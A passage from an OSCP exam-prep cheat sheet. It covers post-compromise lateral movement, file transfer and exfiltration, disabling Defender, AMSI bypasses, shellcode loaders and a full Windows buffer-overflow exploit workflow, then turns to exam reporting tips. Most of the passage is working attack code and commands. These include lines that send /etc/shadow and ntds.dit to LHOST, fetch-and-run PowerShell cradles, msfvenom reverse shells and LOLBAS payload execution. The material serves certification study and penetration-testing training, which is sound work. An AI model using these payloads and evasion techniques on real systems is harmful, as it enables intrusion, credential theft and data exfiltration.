<summary>🖥️ 14.6 Remote Execution Methods (Post-Compromise)</summary>






``` bash
# ── SMB EXECUTION ─────────────────────────────────────────────
impacket-psexec domain/user:pass@IP     # Creates service, gives SYSTEM
impacket-psexec domain/user@IP -hashes :NTLMHASH

# ── WMI EXECUTION ─────────────────────────────────────────────
impacket-wmiexec domain/user:pass@IP    # No service created, less noise
impacket-wmiexec domain/user@IP -hashes :NTLMHASH

# ── SMB SERVICE (quieter than psexec) ─────────────────────────
impacket-smbexec domain/user:pass@IP    # No binary dropped on disk

# ── WINRM ─────────────────────────────────────────────────────
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -H NTLMHASH    # PtH

# ── RDP ───────────────────────────────────────────────────────
xfreerdp /u:user /p:pass /v:IP +clipboard /dynamic-resolution /cert-ignore
xfreerdp /u:Administrator /pth:NTLMHASH /v:IP  # PtH (RestrictedAdmin mode)

# ── nxc SPREAD ───────────────────────────────────────
# After DA — spray creds/hashes on entire subnet:
nxc smb 10.10.10.0/24 -u Administrator -H HASH --local-auth --continue-on-success
nxc smb 10.10.10.0/24 -u Administrator -H HASH --local-auth -x 'whoami'
```


</details>


------------------------------------------------------------------------

## 15. FILE TRANSFERS --- EVERY METHOD


<details>


<summary>🌐 15.1 Serving Files from Kali</summary>






``` bash
# HTTP (most reliable):
python3 -m http.server 80
python3 -m http.server 8080

# HTTPS (if target requires SSL):
python3 -c "
import http.server, ssl, os
os.system('openssl req -new -x509 -keyout /tmp/server.pem -out /tmp/server.pem -days 365 -nodes -subj \"/CN=test\" 2>/dev/null')
httpd = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/tmp/server.pem')
httpd.serve_forever()"

# SMB (best for Windows — no PowerShell needed):
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -username kali -password kali

# FTP (for older Windows):
python3 -m pyftpdlib -p 21 -w   # -w = write allowed

# Upload receiver (catch files FROM target):
python3 -m uploadserver 80
# Target uses: curl -F 'files=@/etc/passwd' http://LHOST/upload
```


</details>


<details>


<summary>🪟 15.2 Download on Windows --- Every Method</summary>






``` powershell
# ── POWERSHELL (most reliable) ───────────────────────────────
# Method 1: WebClient
(New-Object System.Net.WebClient).DownloadFile("http://LHOST/file.exe","C:\Users\Public\file.exe")
# Method 2: iwr
iwr -Uri "http://LHOST/file.exe" -OutFile "C:\Users\Public\file.exe" -UseBasicParsing
# Method 3: In-memory (NO DISK WRITE — best for AV evasion):
IEX(New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")
# Method 4: Encoded download+exec:
powershell -enc BASE64ENCODED_IEX_COMMAND

# ── CMD BUILT-INS ─────────────────────────────────────────────
# Certutil:
certutil.exe -urlcache -split -f "http://LHOST/file.exe" C:\Users\Public\file.exe
# BITS:
bitsadmin /transfer job /download /priority normal "http://LHOST/file.exe" "C:\Users\Public\file.exe"
# curl (Win10+):
curl.exe http://LHOST/file.exe -o C:\Users\Public\file.exe
# From SMB:
copy \\LHOST\share\file.exe C:\Users\Public\file.exe

# ── BASE64 (no network needed) ────────────────────────────────
# Attacker:
base64 -w 0 file.exe; echo
# Target (PowerShell):
$b = "PASTE_BASE64_HERE"
[IO.File]::WriteAllBytes("C:\Users\Public\file.exe",[Convert]::FromBase64String($b))
```


</details>


<details>


<summary>🐧 15.3 Download on Linux --- Every Method</summary>






``` bash
wget http://LHOST/file -O /tmp/file
curl http://LHOST/file -o /tmp/file
curl -sk https://LHOST/file -o /tmp/file  # Skip SSL verify

# /dev/tcp (bash built-in — no tools needed!):
exec 3<>/dev/tcp/LHOST/80
echo -e "GET /file HTTP/1.0\r\nHost: LHOST\r\n\r\n" >&3
cat <&3 | tail -n +7 > /tmp/file   # Skip HTTP headers

# Python:
python3 -c "import urllib.request; urllib.request.urlretrieve('http://LHOST/file','/tmp/file')"

# SCP (if SSH access):
scp user@LHOST:/path/file /tmp/file
scp -i key user@LHOST:/path/file /tmp/file
```


</details>


<details>


<summary>📤 15.4 Exfiltration --- Get Files Back to Kali</summary>






``` bash
# ── FROM LINUX ────────────────────────────────────────────────
# Netcat:
# Kali: nc -nvlp 4444 > loot.tar.gz
tar czf - /etc/shadow /home/ | nc LHOST 4444

# Curl POST:
curl -X POST http://LHOST/upload -F "file=@/etc/shadow"

# Base64 in terminal (paste to Kali):
base64 /etc/shadow; echo

# ── FROM WINDOWS ──────────────────────────────────────────────
# PowerShell upload:
(New-Object Net.WebClient).UploadFile("http://LHOST/upload","C:\Users\user\loot.txt")

# SMB copy:
copy C:\sensitive.txt \\LHOST\share\sensitive.txt
robocopy C:\Users \\LHOST\share\ /E /COPYALL

# Base64 in PS (paste to Kali):
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\NTDS\ntds.dit"))
```


</details>


------------------------------------------------------------------------

## 16. ANTIVIRUS EVASION & DEFENSE BYPASS


<details>


<summary>🛡️ 16.1 Disable / Bypass Windows Defender</summary>






``` powershell
# ── DISABLE DEFENDER (needs admin) ───────────────────────────
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\Public\"
Add-MpPreference -ExclusionPath "C:\Windows\Temp\"
# Via registry:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# ── EXECUTION POLICY BYPASS ───────────────────────────────────
powershell -ep bypass
powershell -ExecutionPolicy Bypass -nop -c "command"
# Via encoded command:
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://LHOST/script.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -enc $enc
# Bypass via pipe:
echo IEX(New-Object Net.WebClient).DownloadString('http://LHOST/s.ps1') | powershell -nop -
```


</details>


<details>


<summary>🔓 16.2 AMSI Bypass</summary>






``` powershell
# Classic (may be patched — always try first):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Via reflection (more evasive):
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# String-split to avoid signature:
$x = 'Syst'+'em.Man'+'agement.Autom'+'ation.A'+'msiU'+'tils'
[Ref].Assembly.GetType($x).GetField('amsiI'+'nitFailed','NonPublic,Static').SetValue($null,$true)

# Memory patch (most reliable):
$Win32 = @"
using System; using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $Win32
$lib = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
$old = 0
[Win32]::VirtualProtect($addr, [UIntPtr]5, 0x40, [ref]$old)
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
```


</details>


<details>


<summary>🔀 16.3 Payload Obfuscation Techniques</summary>






``` bash
# ── MSFVENOM ENCODING ─────────────────────────────────────────
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT \
  -e x86/shikata_ga_nai -i 10 -f exe -o shell_enc.exe
# Multiple encoders chained:
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT \
  -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -f exe -o shell_chain.exe

# ── C SHELLCODE RUNNER (minimal footprint) ────────────────────
cat > runner.c << 'EOF'
#include <windows.h>
#pragma comment(lib,"ws2_32")
unsigned char sh[] = "\xfc\xe8...";   // msfvenom -f c output
int main(){
  void *m=VirtualAlloc(0,sizeof(sh),0x3000,0x40);
  memcpy(m,sh,sizeof(sh));
  CreateThread(0,0,(LPTHREAD_START_ROUTINE)m,0,0,0);
  Sleep(10000);
  return 0;
}
EOF
x86_64-w64-mingw32-gcc runner.c -o runner.exe -s -w

# ── PYTHON TO EXE (AV bypass via packaging) ───────────────────
cat > loader.py << 'EOF'
import ctypes, base64
sc = base64.b64decode("BASE64_SHELLCODE")
buf = bytearray(sc)
ptr = ctypes.windll.kernel32.VirtualAlloc(None,len(buf),0x3000,0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_long(ptr),buf,len(buf))
t = ctypes.windll.kernel32.CreateThread(None,None,ctypes.c_long(ptr),None,None,None)
ctypes.windll.kernel32.WaitForSingleObject(t,-1)
EOF
pyinstaller --onefile --noconsole loader.py

# ── INVOKE-OBFUSCATION ────────────────────────────────────────
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-Obfuscation.psd1')
Invoke-Obfuscation
# Menu choices: TOKEN → ALL → 1

# ── IN-MEMORY ONLY (never touches disk) ───────────────────────
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1')
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerView.ps1')

# ── LOLBAS — Living Off The Land ──────────────────────────────
# https://lolbas-project.github.io
# mshta (execute remote JS/VBS):
mshta.exe http://LHOST/payload.hta
# regsvr32 (no-mark-of-the-web bypass):
regsvr32 /s /n /u /i:http://LHOST/file.sct scrobj.dll
# msbuild (execute inline C#):
msbuild.exe payload.xml
# installutil:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U payload.exe
# certutil (encode/decode):
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe
# rundll32:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("cmd",0,true);
```


</details>


<details>


<summary>🔒 16.4 Constrained Language Mode Bypass</summary>






``` powershell
# Check if CLM is active:
$ExecutionContext.SessionState.LanguageMode   # ConstrainedLanguage = restricted

# Bypass methods:
# 1. Use PowerShell 2.0 (older version, no CLM):
powershell -Version 2 -ep bypass -c "IEX..."
# 2. Use custom runspace:
# 3. PSBypassCLM tool
# 4. .NET directly from cmd:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:bypass.exe bypass.cs
# 5. Use a different interpreter (python, perl, etc.)
```


</details>


------------------------------------------------------------------------

## 17. BUFFER OVERFLOW --- WINDOWS x86 (COMPLETE WORKFLOW)

> ⚠️ **Exam note:** the dedicated, separately-scored BOF machine was
> removed from the OSCP exam in the Nov 2024 format change --- it's no
> longer a guaranteed target. A BOF can still surface as the low-priv
> vector on one of the 3 standalone machines (worth that machine's
> normal 10+10, not a bonus 20), and the skill still matters for PEN-200
> generally and for OSED later --- so this section stays as reference.
> Just don't plan exam-day timing around "guaranteed free points from a
> BOF box."


<details>


<summary>🧠 17.0 BOF Mindset & Setup</summary>






    OSCP BOF IS ALWAYS:
      ✓ Windows x86 (32-bit target application)
      ✓ Stack-based overflow (classic, no heap spray)
      ✓ Known application with known vulnerable command
      ✓ You have access to the application to fuzz locally
      ✓ No ASLR/DEP on the module used for JMP ESP

    TOOLS:
      ✓ Immunity Debugger (on Windows VM)
      ✓ mona.py plugin (copy to Immunity's PyCommands folder)
      ✓ Kali Linux (for pattern gen, msfvenom)

    FIRST COMMAND IN IMMUNITY:
      !mona config -set workingfolder C:\mona\%p

    TARGET TIME: 20 minutes or less

    THE 7 STEPS:
      1. Fuzz → find crash byte count
      2. Pattern → find exact EIP offset  
      3. Control EIP → verify with BBBB
      4. Bad chars → find what bytes corrupt shellcode
      5. JMP ESP → find reliable return address
      6. Shellcode → generate with msfvenom
      7. Exploit → combine + fire


</details>


<details>


<summary>💥 17.1 Step 1 --- Fuzz the Application</summary>






``` python
#!/usr/bin/env python3
# fuzz.py — find crash point
import socket, time, sys

ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "    # ← change per challenge (OVERFLOW1..OVERFLOW10)

buffer = b"A" * 100
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((ip, port))
            s.recv(1024)
            print(f"[*] Sending {len(prefix) + len(buffer)} bytes...")
            s.send(bytes(prefix, "latin-1") + buffer + b"\r\n")
            s.recv(1024)
    except Exception as e:
        print(f"\n[+] Crash at approximately {len(buffer)} bytes!")
        sys.exit(0)
    buffer += b"A" * 100
    time.sleep(0.5)
```

    # In Immunity: Run the app → Run fuzz.py → app crashes → note byte count
    # Restart the app: Debug → Restart (Ctrl+F2) → Run (F9)


</details>


<details>


<summary>📐 17.2 Step 2 --- Find Exact EIP Offset</summary>






``` bash
# Generate pattern slightly longer than crash count:
msf-pattern_create -l 2400   # Use crash_count + 400

# In script — replace A*100 with the pattern output
# Run → App crashes → note EIP value in Immunity (e.g. 386F4337)

# Find the offset:
msf-pattern_offset -l 2400 -q 386F4337
# OR in Immunity:
# !mona findmsp -distance 2400
```

``` python
# Step 2 script: send_pattern.py
import socket
ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "
offset = 0    # Will be 0 for now
overflow = "Aa0Aa1Aa2..."   # Paste msf-pattern_create output here
retn = ""
padding = ""
payload = prefix + overflow + retn + padding + "\r\n"
with socket.socket() as s:
    s.connect((ip, port)); s.recv(1024)
    s.send(bytes(payload, "latin-1"))
    print("[*] Pattern sent — check EIP in Immunity")
```


</details>


<details>


<summary>🎯 17.3 Step 3 --- Control EIP</summary>






``` python
# Step 3 script: control_eip.py — verify offset is correct
import socket
ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "
offset = 1978   # ← your calculated offset
overflow = b"A" * offset
retn = b"BBBB"        # Should appear as 42424242 in EIP register
padding = b"C" * (3000 - offset - 4)

with socket.socket() as s:
    s.connect((ip, port)); s.recv(1024)
    s.send(bytes(prefix, "latin-1") + overflow + retn + padding + b"\r\n")
    print("[*] Check Immunity — EIP should be 42424242, ESP points to CCCCs")
```


</details>


<details>


<summary>🚫 17.4 Step 4 --- Bad Characters</summary>






``` python
# Step 4 script: find_badchars.py
import socket

ip   = "TARGET_IP"
port = TARGET_PORT
prefix = "OVERFLOW1 "
offset = 1978
overflow = b"A" * offset
retn = b"BBBB"

# Start with all bytes EXCEPT \x00 (null — always bad)
# Remove known bad chars as you discover them
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

with socket.socket() as s:
    s.connect((ip, port)); s.recv(1024)
    s.send(bytes(prefix, "latin-1") + overflow + retn + badchars + b"\r\n")
    print("[*] Badchars sent — check ESP dump in Immunity")
```

    # MONA WORKFLOW (faster than manual):
    # 1. Generate reference bytearray in Immunity:
    !mona bytearray -b "\x00"           ← start with just null

    # 2. Send the badchars payload, note ESP value when it crashes

    # 3. Compare memory at ESP with reference:
    !mona compare -f C:\mona\APPNAME\bytearray.bin -a 0x00DEFF88   ← your ESP address

    # 4. Mona output shows: "Corrupt" or list of bad bytes
    #    e.g., "0a 0d" = \x0a and \x0d are bad

    # 5. Remove from badchars array AND regenerate bytearray:
    !mona bytearray -b "\x00\x0a\x0d"

    # 6. Repeat until output shows: "Status: OK - No badchars found!"
    # NOTE: When mona says \x09 is bad, also test \x0a — one bad char can
    # corrupt the next byte making it look bad too (cascading effect)


</details>


<details>


<summary>🔀 17.5 Step 5 --- Find JMP ESP</summary>






    # In Immunity Debugger:

    # List all modules and their protections:
    !mona modules

    # Output columns: Module | Rebase | SafeSEH | ASLR | NXCompat | OS DLL
    # WANT: all False/False/False/False for the module you pick
    # AVOID: any module with True (especially ASLR)

    # Find JMP ESP addresses in safe module (with bad chars excluded):
    !mona jmp -r esp -cpb "\x00\x0a\x0d"

    # Alternative — find raw opcode (FF E4 = JMP ESP):
    !mona find -s "\xff\xe4" -m module_name.dll

    # Mona creates: C:\mona\APPNAME\jmp.txt
    # Open it → pick an address → note in LITTLE ENDIAN format

    # EXAMPLE:
    # Address: 0x625011AF
    # Little endian in Python: b"\xaf\x11\x50\x62"
    # Little endian in hex:    \xaf\x11\x50\x62

    # VERIFY: Set breakpoint on that address
    # In Immunity: Go to address (Ctrl+G) → type address → F2 (set BP)
    # Run exploit → should hit BP → confirms JMP ESP works


</details>


<details>


<summary>💣 17.6 Step 6 --- Generate Shellcode</summary>






``` bash
# Use EXACT same bad chars you found in step 4!
# EXITFUNC=thread prevents the whole service from crashing

msfvenom -p windows/shell_reverse_tcp \
  LHOST=YOUR_LHOST \
  LPORT=YOUR_LPORT \
  EXITFUNC=thread \
  -f python \
  -b "\x00\x0a\x0d"        # ← YOUR bad chars here

# Output will look like:
# buf =  b""
# buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5..."

# Copy the entire buf = ... block
# Shellcode size is typically ~350-400 bytes
# NOP sled of 16 bytes is enough padding before shellcode
```


</details>


<details>


<summary>🚀 17.7 Step 7 --- Final Exploit</summary>






``` python
#!/usr/bin/env python3
# exploit.py — THE FINAL EXPLOIT
import socket

ip   = "TARGET_IP"
port = TARGET_PORT

# ── FILL THESE IN ─────────────────────────────────────────────
prefix   = "OVERFLOW1 "   # The vulnerable command
offset   = 1978           # Exact EIP offset
retn     = b"\xaf\x11\x50\x62"  # JMP ESP in little endian
padding  = b"\x90" * 16  # NOP sled (16 bytes is plenty)

# Paste msfvenom -f python output below:
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
# ... (full shellcode here)

# ── BUILD PAYLOAD ─────────────────────────────────────────────
payload = bytes(prefix, "latin-1") + b"A" * offset + retn + padding + buf + b"\r\n"

# ── FIRE ──────────────────────────────────────────────────────
print(f"[*] Payload size: {len(payload)} bytes")
print(f"[*] Sending exploit to {ip}:{port}...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.recv(1024)
    s.send(payload)
    print("[+] Done! Check your listener...")
```

``` bash
# Start listener BEFORE running exploit:
nc -nvlp YOUR_LPORT
# Or:
rlwrap nc -nvlp YOUR_LPORT    # For arrow keys in shell
```


</details>


<details>


<summary>📋 17.8 Mona Quick Reference --- All Commands</summary>






    # ── SETUP ─────────────────────────────────────────────────────
    !mona config -set workingfolder C:\mona\%p

    # ── PATTERN ───────────────────────────────────────────────────
    !mona pc 2400                # Pattern create (length 2400)
    !mona po 386F4337            # Pattern offset for EIP value
    !mona findmsp -distance 2400 # Find all pattern matches in memory

    # ── BYTEARRAY ─────────────────────────────────────────────────
    !mona bytearray -b "\x00"
    !mona bytearray -b "\x00\x0a\x0d\x25\x26\x2b\x3d"  # All bad chars

    # ── COMPARE ───────────────────────────────────────────────────
    !mona compare -f C:\mona\APP\bytearray.bin -a 0xDEADBEEF
    # Status: OK = no more bad chars | Corrupted = still more to find

    # ── MODULES ───────────────────────────────────────────────────
    !mona modules
    # Shows: Module, Base, Top, Rebase, SafeSEH, ASLR, NXCompat, OS DLL

    # ── JMP ESP ───────────────────────────────────────────────────
    !mona jmp -r esp -cpb "\x00\x0a\x0d"
    !mona jmp -r esp -m "module.dll" -cpb "\x00"
    !mona find -s "\xff\xe4" -m module.dll    # Manual opcode search

    # ── SUGGEST ───────────────────────────────────────────────────
    !mona suggest    # Suggests exploit structure after crash

    # ── STACK / REGISTERS ─────────────────────────────────────────
    !mona seh -cpb "\x00"       # Find SEH gadgets (for SEH overflows)
    !mona nosafeseh             # Find modules without SafeSEH

    # ── EGGHUNTER ─────────────────────────────────────────────────
    !mona egg -t w00t           # Generate egghunter for tag "w00t"

    # ── OUTPUT LOCATION ───────────────────────────────────────────
    # All output → C:\mona\APPNAME\
    # Key files: jmp.txt, bytearray.bin, compare.txt, modules.txt


</details>


<details>


<summary>🔧 17.9 Common BOF Problems & Fixes</summary>






    PROBLEM: EIP shows "41414141" after sending pattern
    FIX: Pattern wasn't long enough — increase msf-pattern_create -l value

    PROBLEM: EIP not overwritten even with correct offset
    FIX: Check if there's a length check in the protocol — try different prefix

    PROBLEM: Shellcode not executing even with correct JMP ESP
    FIX: 
      1. Bad chars in shellcode — recheck byte array
      2. Not enough space — verify ESP has 400+ bytes available
      3. NOP sled too short — increase to 32 bytes
      4. EXITFUNC wrong — use EXITFUNC=thread

    PROBLEM: Shell connects but dies immediately
    FIX: Use EXITFUNC=thread in msfvenom

    PROBLEM: "No badchars found" but exploit still fails  
    FIX: The \x00 you assumed is bad might be fine — test explicitly

    PROBLEM: All JMP ESP addresses have bad chars in them
    FIX: Look in other modules — use !mona jmp -r esp (no -m flag)
         Try CALL ESP, PUSH ESP/RET combos

    PROBLEM: App crashes before reaching shellcode
    FIX: Shellcode corrupted — re-run bad char analysis from scratch

    PRO TIPS:
      - Always restart app cleanly between each test (Ctrl+F2 then F9)
      - Verify ESP address fresh each run — may differ by small amount
      - 16 NOP bytes before shellcode is standard; increase if issues
      - Generate shellcode with -f python for cleaner copy-paste
      - Use rlwrap nc -nvlp PORT for better shell interaction


</details>


------------------------------------------------------------------------

## 18. REPORTING & DOCUMENTATION

> **Official proof rule:** each `local.txt` / `proof.txt` must be shown from its **original location** in an **interactive shell** using `cat` or `type`, and the same screenshot must show the target's IP address using `ip addr`, `ifconfig` or `ipconfig`. A web-based shell is not valid for proof-file submission.

> **Control-panel rule:** submit every obtained `local.txt` / `proof.txt` value in the exam control panel **before the attack window ends**.




<details>


<summary>📸 18.1 Screenshot Requirements --- Never Fail on This</summary>






``` bash
# ── LINUX PROOF SCREENSHOT ────────────────────────────────────
# Single command that captures the required evidence plus useful context:
hostname; id; ip addr; pwd; cat /root/proof.txt
# OR (more readable):
echo "=== HOSTNAME ===" && hostname
echo "=== USER ===" && id && whoami
echo "=== IP ===" && ip a
echo "=== PROOF ===" && cat /root/proof.txt

# ── WINDOWS PROOF SCREENSHOT ──────────────────────────────────
echo === HOSTNAME === && hostname
echo === USER === && whoami
echo === IP === && ipconfig
echo === PROOF === && type C:\Users\Administrator\Desktop\proof.txt

# ── WHAT THE SCREENSHOT MUST SHOW ────────────────────────────
# REQUIRED: proof.txt / local.txt CONTENT read with cat/type from its ORIGINAL path
# REQUIRED: target IP visible via ip addr/ifconfig/ipconfig in the SAME screenshot
# REQUIRED: an INTERACTIVE target shell (PowerShell Core / PSSession is accepted)
# Optional but useful: hostname + whoami/id + pwd/cd, if the screenshot stays readable
# Keep the command and output together; do not splice/crop different windows together

# ── TAKE SCREENSHOTS AS YOU GO ────────────────────────────────
# Don't wait until the end — screenshot every major step:
# - Initial nmap results
# - Service version that led to exploit
# - Exploit running
# - Initial shell (whoami)
# - Privesc technique used
# - Root/Admin proof
```


</details>


<details>


<summary>📄 18.2 Proof File Locations</summary>






    LINUX:
      User flag: /home/USERNAME/local.txt
      Root flag: /root/proof.txt

    WINDOWS:
      User flag: C:\Users\USERNAME\Desktop\local.txt
      Admin flag: C:\Users\Administrator\Desktop\proof.txt
      Use the exact original path shown by the target/control-panel context; do not copy the flag elsewhere for the screenshot

    IMPORTANT:
      - Submit flags in the control panel AS SOON AS you get them
      - Don't rely on memory — copy/paste to notes immediately
      - If proof.txt is denied, your current context does not satisfy the proof-file access requirement; verify the intended privileged identity and original path
      - Both flags count for points — don't skip user flag
      
    PARTIAL POINTS:
      - Local.txt (user shell) = 10 pts
      - Proof.txt (root/admin) = 10 pts
      - Total per machine = 20 pts
      - Documenting HOW you got there is required for credit


</details>


<details>


<summary>📝 18.3 Note-Taking Template (Use Per Machine)</summary>






``` markdown
# Machine: TARGET_IP — HOSTNAME

## Status: [ ] Scanning [ ] Foothold [ ] Privesc [ ] Root [ ] Documented

## Open Ports
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 7.4 | |
| 80   | HTTP    | Apache 2.4 | WordPress |

## Credentials Found
| Username | Password | Hash | Service | Where Found |
|----------|----------|------|---------|-------------|
| admin    | admin123 |      | SSH     | /etc/backup |

## Attack Path
1. Port 80 → WordPress 5.2.3
2. wpscan → user: admin
3. Brute force → admin:admin123
4. Theme editor → PHP shell
5. Shell as www-data
6. /etc/cron.d → root runs /opt/backup.sh
7. /opt/backup.sh writable → reverse shell
8. Root!

## Commands Used
```bash
# Key commands here
```

## Proof

-   local.txt: \[CONTENT\]
-   proof.txt: \[CONTENT\]
-   Screenshots: \[FILENAMES\]


<!-- -->

    </details>

    <details>
    <summary>📊 18.4 OSCP Report Structure</summary>

REQUIRED SECTIONS: 1. High-Level Summary - \# of machines compromised -
Severity of findings

2.  Methodology
    -   Tools used
    -   General approach
3.  Per-Machine Writeup (for EACH machine):
    a.  Machine info (IP, OS, hostname)
    b.  Service enumeration
    c.  Exploitation (step by step, with screenshots)
    d.  Post-exploitation
    e.  Privilege escalation (step by step, with screenshots)
    f.  Proof (original-path cat/type in an interactive shell; target IP + full flag visible together)
4.  Appendix
    -   Tool outputs
    -   Modified exploit code (full code)

REPORT TIPS: - Document the commands/output needed to reproduce the compromise step-by-step
- Keep screenshots readable and tied to each step
- For an UNMODIFIED public exploit, OffSec says provide the source URL rather than dumping pages of code
- For a MODIFIED exploit, include the modified code, original URL, shellcode command if applicable,
  highlight the changes, and explain why they were required
- Submit the PDF inside the required .7z archive within 24 hours of exam end

COMMON REPORT FAILURES: ✗ Proof screenshot without IP visible ✗ Steps
not reproducible from your writeup ✗ Missing screenshots at key steps ✗
No proof of privilege escalation method ✗ Late submission

    </details>

    <details>
<summary>⏱️ 18.5 Time Management — 2026 Rotation Strategy</summary>

There is **no universally correct "AD first" strategy**. Recent pass reports include candidates who cleared AD early and others who passed mainly through standalones. Use evidence, not superstition.

### Phase 1 — 0:00 to ~0:45: Build the board

- Read every control-panel objective.
- Start full TCP/service enumeration on all targets.
- Record hostnames/vhosts immediately.
- Start issued-credential AD checks.
- Identify the **two strongest attack signals**, not the two machines you personally prefer.

### Phase 2 — Work in 20–30 minute evidence blocks

Stay on a target while you are producing evidence:

```text
new credential
new file/share
new service
new privilege
new attack edge
new working primitive
new validated exploit condition
```

If a block ends with **no new evidence**, write the next hypothesis and rotate.

### Phase 3 — Bank points immediately

Whenever `local.txt` or `proof.txt` is obtained:

1. Produce the official screenshot immediately.
2. Submit the flag in the control panel immediately.
3. Record the exact exploit/privesc steps.
4. Update your current point total and passing combinations.

### Phase 4 — At 70+ points

Before chasing extra points:

```text
[ ] every earned flag submitted
[ ] every proof screenshot valid
[ ] IP + flag content visible
[ ] proof read from original location via interactive shell
[ ] exploit/privesc steps reproducible
[ ] modified exploit code/changes preserved
```

Several recent passers intentionally used remaining access time to verify notes/screenshots rather than risk losing a pass through poor documentation.

### Break schedule

- Short break whenever you catch yourself repeating commands.
- Aim for a real 10–20 minute break every ~2–3 hours.
- Eat, hydrate, and sleep/rest if needed.
- OffSec explicitly expects candidates to take rest breaks, eat, drink and sleep during the 23h45m window.

### "Read output twice" rule

Before declaring a tool useless:

```text
1. Read the summary.
2. Search output for ERROR / FAIL / WARN / password / user / writable / service / path.
3. Compare it with your current hypothesis.
```

One July 2026 passer specifically attributed long delays to not paying enough attention to tool output.

</details>

    ---

    ## 19. QUICK REFERENCE CARD

    <details>
    <summary>🔌 19.1 Ports & Services Reference</summary>

TCP PORTS: 21 FTP \| 1080 SOCKS 22 SSH \| 1099 Java RMI 23 Telnet \|
1433 MSSQL 25 SMTP \| 1521 Oracle TNS 53 DNS \| 2049 NFS 80 HTTP \| 2375
